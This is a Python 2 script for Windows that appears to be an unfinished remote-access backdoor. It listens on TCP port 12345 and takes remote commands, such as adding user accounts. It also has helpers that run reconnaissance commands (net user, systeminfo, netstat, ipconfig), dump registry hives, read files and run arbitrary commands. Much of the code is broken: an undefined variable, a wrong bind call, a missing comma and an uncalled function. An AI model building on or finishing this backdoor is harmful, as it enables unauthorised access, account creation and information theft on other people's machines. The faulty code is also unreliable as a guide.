import subprocess, socket, time, struct
from _winreg import *
from sys import *

def recv_data(sock):
	data_len, = struct.unpack("!I", sock.recv(4))
	return sock.recv(data_len)
	
def send_data(sock,data):
	data_len, = struct.unpack("!I", data_len)
	sock.send(data)
	return
	
	
def infogather(log_name, sock):
	
	print "========================="
	print "   Information Gatherer   "
	print "========================="
	print "Gathering network configuration... this may take a while."
	 
	cmd_list = ["arp", "-a"],["net","accounts"],["netstat", "-o"],['net','file'],['net','localgroup'],["net", "view"],["net", "user"],["systeminfo"],["tasklist"],["ipconfig", "/all"]	
	
	log = open(log_name, "w")
	
	for i in cmd_list:
			subprocess.Popen(i, 0, None, log, log).wait() # loop through all the system information gathering commands.
	
	print ''
	print "[+]LOG CREATED!"
	
	log.close() 
	return
	
error_log = open("Error.log", "w")
	

def createuser(name, pwd):
	cmd = ["net", "user", "/add", name, pwd]
	subprocess.Popen(cmd, 0, None, None, None, error_log, shell=True).wait()
	log_file.close()
	return
	
def deleteuser(name):
	cmd = ["net", "user" "/del", name]
	subprocess.Popen(cmd, 0, None, None, None, error_log, shell=True).wait()
	log_file.close()

	return
	
def download_registry(root, path, sock):
	
	key_hdl = OpenKey(root,path)
	num_subkeys, num_values, last_modified = QueryInfoKey(key_hdl)
	print "SubKeys: %d\nValues: %d\n" % (num_subkeys, num_values)
	
	
	print "============="
	print "   SubKeys   "
	print "============="
	for i in range(num_subkeys):
		print EnumKey(key_hdl, i)
		
	print "============"
	print "   Values   "
	print "============"
	
	for i in range(num_values):
		v_name, v_data, d_type = EnumValue(key_hdl, i)
		print "%s : %s" % (v_name, v_data)
	
	return

def download_file(file_name, sock):
	f = open(file_name, "r")
	print f.read()
	
	return
	
def execute_command(cmd, log_name):
	log = open(log_name, "w")
	try:
		subprocess.Popen(cmd, 0, None, log, log).wait()
	except WindowsError:
		cmd[0] = cmd[0] + '.com'
		subprocess.Popen(cmd, 0, None, log, log).wait()
		
	return
	
def get_data(sock, str_to_send):
	send_data(sock, str_to_send)
	return recv_data(sock)
	
def endlog():
	print ""
	print ""
	print ""
	print "================"
	print "   END OF LOG   "
	print "================"

def main():
	reg_hives = ['HKEY_CLASSES_ROOT'],['HKEY_CURRENT_USER'],['HKEY_LOCAL_MACHINE'],['HKEY_USERS'],['HKEY_CURRENT_CONFIG']
	#log_file = open("log.txt","w")
	#infogather("inforgathererlog.txt",0)
	execute_command(["tree", "C:\\"], "treelog.txt")
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind('', 12345)
	sock.listen(1)
	conn_sock, conn_info = sock.accept()
	
	while True:
		cmd = get_data(conn_sock, "COMMAND: ")
		
		if cmd == "CU":
			createuser(get_data(conn_sock, "Name: "), get_data(conn_sock, "Password: "))
		elif cmd == "DU":
			deleteuser
		
	
	#for i in reg_hives:
		#download_registry(i, "CONSOLE", 0)
		
	#endlog()
	
	
main()
